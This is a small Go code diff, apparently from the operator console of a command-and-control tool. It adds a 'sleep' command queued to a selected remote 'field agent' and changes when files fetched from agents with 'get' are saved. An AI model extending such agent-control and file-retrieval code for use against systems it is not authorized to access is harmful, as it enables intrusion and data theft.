@@ -42,6 +42,15 @@ func cliHandler() {
 			switch baseCommand {
 			case "show":
 				showHandler(separatedCommand)
+			case "sleep":
+				if len(separatedCommand) > 1 && selectedAgent != "" {
+					sendCommand := &structures.Commands{}
+					sendCommand.Command = completeCommand
+
+					fieldAgents[fieldAgentPosition(selectedAgent)].Commands = append(fieldAgents[fieldAgentPosition(selectedAgent)].Commands, *sendCommand)
+				} else {
+					log.Println("Specify the agent wait time")
+				}
 			case "select":
 				selectHandler(separatedCommand)
 			case "send":
@@ -191,8 +200,7 @@ func startListener(port string) {
 							log.Println("Response from command: ", command.Command)
 							println(command.Response)
 							if helpers.SeparateCommand(command.Command)[0] == "get" &&
-								message.Commands[index].File.Error == false &&
-								len(message.Commands[index].File.FileData) > 0 {
+								!message.Commands[index].File.Error {
 								saveFile(message.Commands[index].File)
 							}
 						}
